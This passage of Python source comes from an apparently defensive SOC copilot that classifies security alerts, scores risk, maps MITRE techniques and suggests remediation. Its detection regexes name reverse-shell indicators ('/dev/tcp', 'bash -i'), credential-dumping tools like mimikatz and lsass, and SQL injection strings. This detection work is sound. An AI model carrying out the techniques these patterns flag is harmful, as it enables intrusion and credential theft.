        self._incident_templates: dict[str, str] = INCIDENT_TEMPLATES
        self._remediation_steps: dict[str, list[str]] = REMEDIATION_STEPS
        self._query_templates: dict[str, str] = QUERY_TEMPLATES

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def analyze_alert(self, alert_data: dict[str, Any]) -> str:
        """Generate a comprehensive incident analysis summary for an alert.

        Args:
            alert_data: Dictionary containing alert details such as:
                - rule_id / rule_name
                - severity (critical/high/medium/low)
                - source_ip
                - target_host / destination_ip
                - attack_type / category
                - message / raw_log
                - timestamp

        Returns:
            Formatted incident analysis string.
        """
        attack_type = self._resolve_attack_type(alert_data)
        mitre = self._mitre_map.get(attack_type)
        risk = self._compute_risk_score(alert_data)
        risk_level = self._risk_level_label(risk)
        severity = alert_data.get("severity", "medium").upper()
        confidence = self._compute_confidence(alert_data)

        # Build remediation action list
        remediation = self._remediation_steps.get(attack_type, self._remediation_steps.get("brute_force", []))
        actions_text = "\n".join(
            step.format(**self._safe_format_dict(alert_data))
            for step in remediation[:6]
        )

        template = self._incident_templates.get(attack_type)
        if template is None:
            # Fallback generic template
            return self._generic_analysis(alert_data, attack_type, mitre, risk_level, confidence)

        fmt = self._safe_format_dict(alert_data)
        fmt.update({
            "risk_level": f"{risk_level} (Score: {risk:.2f}/1.00)",
            "severity": severity,
            "confidence": f"{confidence}%",
            "impact": self._assess_impact(alert_data),
            "actions": actions_text,
            "mitre_tactic": mitre.tactic if mitre else "Unknown",
            "mitre_technique": mitre.technique_name if mitre else "Unknown",
            "mitre_id": mitre.technique_id if mitre else "N/A",
        })

        try:
            return template.format(**fmt)
        except KeyError:
            return self._generic_analysis(alert_data, attack_type, mitre, risk_level, confidence)

    def explain_attack(self, attack_type: str) -> str:
        """Return a detailed explanation of the specified attack type.

        Args:
            attack_type: One of brute_force, reverse_shell, privilege_escalation,
                lateral_movement, port_scan, data_exfiltration, webshell,
                encoded_powershell, cryptominer, dns_tunneling, credential_dumping,
                sql_injection.

        Returns:
            Detailed markdown explanation of the attack type.
        """
        normalized = attack_type.lower().replace(" ", "_").replace("-", "_")
        explanation = self._attack_explanations.get(normalized)
        if explanation:
            mitre = self._mitre_map.get(normalized)
            if mitre:
                explanation += (
                    f"\n\n### MITRE ATT&CK Reference\n"
                    f"- **Tactic:** {mitre.tactic}\n"
                    f"- **Technique:** {mitre.technique_name} ({mitre.technique_id})\n"
                    f"- **Description:** {mitre.description}\n"
                )
            return explanation
        # Try fuzzy match
        for key, text in self._attack_explanations.items():
            if normalized in key or key in normalized:
                return text
        return (
            f"## {attack_type.replace('_', ' ').title()}\n\n"
            f"No detailed explanation available for '{attack_type}'. "
            f"Please check the attack type identifier and try again.\n\n"
            f"Available attack types: {', '.join(sorted(self._attack_explanations.keys()))}"
        )

    def recommend_remediation(self, alert_data: dict[str, Any]) -> list[str]:
        """Return prioritized remediation steps for an alert.

        Args:
            alert_data: Dictionary with alert details.

        Returns:
            Ordered list of remediation steps, highest priority first.
        """
        attack_type = self._resolve_attack_type(alert_data)
        steps = self._remediation_steps.get(attack_type, [])

        if not steps:
            return [
                "1. Investigate the alert and review raw log entries",
                "2. Check threat intelligence for source IP reputation",
                "3. Correlate with other events from the same timeframe",
                "4. Assess the impact on affected systems",
                "5. Contain the threat by isolating affected systems if necessary",
                "6. Document findings and update detection rules",
            ]

        fmt = self._safe_format_dict(alert_data)
        formatted_steps: list[str] = []
        for step in steps:
            try:
                formatted_steps.append(step.format(**fmt))
            except KeyError:
                formatted_steps.append(step)
        return formatted_steps

    def answer_query(self, query: str, context: dict[str, Any] | None = None) -> str:
        """Answer SOC analyst queries using keyword matching and templates.

        Args:
            query: Natural-language question from an analyst.
            context: Optional context (current alert, system state).

        Returns:
            Helpful response string.
        """
        query_lower = query.lower().strip()
        context = context or {}

        # Check for attack type explanation requests
        explain_match = re.search(
            r"(?:what is|explain|tell me about|describe)\s+(?:a\s+)?(.+?)(?:\s+attack)?$",
            query_lower,
        )
        if explain_match:
            attack_type = explain_match.group(1).strip().replace(" ", "_")
            if attack_type in self._attack_explanations:
                return self.explain_attack(attack_type)

        # Keyword-based template matching
        best_match: str | None = None
        best_score = 0
        for key, response in self._query_templates.items():
            keywords = key.split()
            score = sum(1 for kw in keywords if kw in query_lower)
            if score > best_score:
                best_score = score
                best_match = response

        if best_match and best_score > 0:
            return best_match

        # Context-aware fallback
        if "alert" in context:
            alert = context["alert"]
            attack_type = self._resolve_attack_type(alert)
            return (
                f"Regarding the current {attack_type.replace('_', ' ')} alert:\n\n"
                f"{self.analyze_alert(alert)}"
            )

        return (
            "I'm the SentinelX SOC Copilot. I can help you with:\n"
            "- Alert analysis and incident investigation\n"
            "- Attack technique explanations\n"
            "- Remediation recommendations\n"
            "- MITRE ATT&CK mapping\n"
            "- False positive assessment\n\n"
            "Try asking questions like:\n"
            "- 'What is a brute force attack?'\n"
            "- 'How do I investigate this alert?'\n"
            "- 'Is this a false positive?'\n"
            "- 'What are the remediation steps?'"
        )

    # ------------------------------------------------------------------
    # Risk Scoring
    # ------------------------------------------------------------------

    def _compute_risk_score(self, alert_data: dict[str, Any]) -> float:
        """Compute a risk score from 0.0 to 1.0 based on alert attributes."""
        severity = alert_data.get("severity", "medium").lower()
        severity_score = SEVERITY_WEIGHTS.get(severity, 0.5)

        # Frequency factor: more occurrences = higher risk
        count = int(alert_data.get("count", alert_data.get("attempt_count", 1)))
        frequency_score = min(1.0, count / 100.0) if count > 1 else 0.2

        # Target criticality
        target_type = alert_data.get("target_type", "unknown").lower()
        criticality = TARGET_CRITICALITY.get(target_type, 0.5)

        # Attack type weight
        attack_type = self._resolve_attack_type(alert_data)
        attack_weights: dict[str, float] = {
            "reverse_shell": 0.95,
            "data_exfiltration": 0.95,
            "credential_dumping": 0.9,
            "webshell": 0.9,
            "privilege_escalation": 0.85,
            "lateral_movement": 0.85,
            "encoded_powershell": 0.8,
            "brute_force": 0.7,
            "cryptominer": 0.6,
            "dns_tunneling": 0.75,
            "port_scan": 0.4,
            "sql_injection": 0.85,
        }
        attack_score = attack_weights.get(attack_type, 0.5)

        # Weighted combination
        risk = (
            severity_score * 0.30
            + frequency_score * 0.15
            + criticality * 0.20
            + attack_score * 0.35
        )
        return round(min(1.0, max(0.0, risk)), 4)

    def _compute_confidence(self, alert_data: dict[str, Any]) -> int:
        """Compute detection confidence as a percentage (0-100)."""
        confidence = 50
        if alert_data.get("rule_id"):
            confidence += 15
        count = int(alert_data.get("count", alert_data.get("attempt_count", 0)))
        if count >= 10:
            confidence += 20
        elif count >= 5:
            confidence += 10
        if alert_data.get("source_ip"):
            confidence += 5
        severity = alert_data.get("severity", "").lower()
        if severity in ("critical", "high"):
            confidence += 10
        return min(100, confidence)

    @staticmethod
    def _risk_level_label(score: float) -> str:
        """Convert numeric risk score to human-readable label."""
        if score >= 0.85:
            return "🔴 CRITICAL"
        if score >= 0.65:
            return "🟠 HIGH"
        if score >= 0.40:
            return "🟡 MEDIUM"
        if score >= 0.20:
            return "🔵 LOW"
        return "⚪ INFORMATIONAL"

    @staticmethod
    def _assess_impact(alert_data: dict[str, Any]) -> str:
        """Assess business impact based on alert attributes."""
        severity = alert_data.get("severity", "medium").lower()
        target_type = alert_data.get("target_type", "unknown").lower()

        if severity == "critical" or target_type in ("domain_controller", "database_server"):
            return "SEVERE — Potential full infrastructure compromise"
        if severity == "high" or target_type in ("web_server", "mail_server"):
            return "HIGH — Significant risk to business-critical systems"
        if severity == "medium":
            return "MODERATE — Suspicious activity requiring investigation"
        return "LOW — Minimal immediate business impact"

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _resolve_attack_type(alert_data: dict[str, Any]) -> str:
        """Determine attack type from various alert data fields."""
        # Direct attack_type field
        attack_type = alert_data.get("attack_type", "").lower().replace(" ", "_").replace("-", "_")
        if attack_type:
            return attack_type

        # Try category field
        category = alert_data.get("category", "").lower().replace(" ", "_").replace("-", "_")
        if category in MITRE_MAP:
            return category

        # Try to infer from message / rule_name
        message = (
            alert_data.get("message", "")
            + " "
            + alert_data.get("rule_name", "")
        ).lower()

        patterns: list[tuple[str, str]] = [
            (r"brute.?force|failed.?password|failed.?login", "brute_force"),
            (r"reverse.?shell|/dev/tcp|bash\s+-i", "reverse_shell"),
            (r"privilege.?escalat|sudo|su\s+root|suid", "privilege_escalation"),
            (r"lateral.?move|pass.the.hash|psexec|wmi", "lateral_movement"),
            (r"port.?scan|nmap|syn.?scan|service.?detect", "port_scan"),
            (r"exfiltrat|data.?transfer|upload.*external", "data_exfiltration"),
            (r"web.?shell|c99|r57|cmd=|exec=", "webshell"),
            (r"encoded.*powershell|encodedcommand|-enc\s", "encoded_powershell"),
            (r"crypto.?min|xmrig|stratum|coin.?hive", "cryptominer"),
            (r"dns.?tunnel|iodine|dnscat", "dns_tunneling"),
            (r"credential.?dump|mimikatz|lsass|hashdump", "credential_dumping"),
            (r"sql.?inject|union.*select|or\s+1\s*=\s*1", "sql_injection"),
        ]
        for pattern, atype in patterns:
            if re.search(pattern, message):
                return atype

        return "unknown"

    @staticmethod
    def _safe_format_dict(alert_data: dict[str, Any]) -> dict[str, str]:
        """Build a format dictionary with sensible defaults for template rendering."""
        return {
            "source_ip": str(alert_data.get("source_ip", "Unknown")),
            "dest_ip": str(alert_data.get("destination_ip", alert_data.get("dest_ip", "Unknown"))),
            "dest_port": str(alert_data.get("destination_port", alert_data.get("dest_port", "Unknown"))),
            "target_host": str(alert_data.get("target_host", alert_data.get("hostname", "Unknown"))),
            "source_host": str(alert_data.get("source_host", alert_data.get("hostname", "Unknown"))),
            "username": str(alert_data.get("username", alert_data.get("user", "Unknown"))),
            "attempt_count": str(alert_data.get("count", alert_data.get("attempt_count", "N/A"))),
            "data_volume": str(alert_data.get("data_volume", alert_data.get("bytes_transferred", "Unknown"))),
            "port_count": str(alert_data.get("port_count", alert_data.get("ports_scanned", "Unknown"))),
            "timeframe": str(alert_data.get("timeframe", "the detection window")),
            "url_path": str(alert_data.get("url_path", alert_data.get("url", "Unknown"))),
            "protocol": str(alert_data.get("protocol", "SSH/RDP")),
            "escalation_method": str(alert_data.get("escalation_method", alert_data.get("method", "sudo/su"))),
        }

    def _generic_analysis(
        self,
        alert_data: dict[str, Any],
        attack_type: str,
        mitre: MITREMapping | None,
        risk_level: str,
        confidence: int,
    ) -> str:
        """Fallback generic analysis when no specific template is available."""
        source = alert_data.get("source_ip", "Unknown source")
        target = alert_data.get("target_host", alert_data.get("hostname", "Unknown target"))
        severity = alert_data.get("severity", "medium").upper()

        mitre_info = ""
        if mitre:
            mitre_info = (
                f"\n**MITRE ATT&CK:** {mitre.tactic} / {mitre.technique_name} ({mitre.technique_id})\n"
            )

        return (
            f"🚨 **INCIDENT ANALYSIS: {attack_type.replace('_', ' ').title()}**\n\n"
            f"**What Happened:** Suspicious activity classified as "
            f"'{attack_type.replace('_', ' ')}' was detected. Source: {source}, "
            f"Target: {target}.\n\n"
            f"**Risk Assessment:** {risk_level}\n"
            f"- Severity: {severity}\n"
            f"- Confidence: {confidence}%\n"
            f"- Business Impact: {self._assess_impact(alert_data)}\n"
            f"{mitre_info}\n"
            f"**Recommended Actions:**\n"
            + "\n".join(self.recommend_remediation(alert_data)[:5])
        )
